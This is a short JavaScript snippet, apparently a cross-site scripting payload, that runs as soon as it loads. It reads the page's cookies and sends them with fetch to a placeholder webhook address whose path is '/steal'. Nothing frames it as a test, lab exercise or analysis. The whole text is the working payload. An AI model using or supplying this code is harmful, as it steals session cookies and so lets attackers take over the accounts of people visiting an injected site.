(function() {
    const serverUrl = "http://<webhook>/steal";
    function sendCookies() {
        if (document.cookie) {
            fetch(`${serverUrl}?cookie=${encodeURIComponent(document.cookie)}`, {
                method: "GET"
            });
        }
    }
    sendCookies();
})();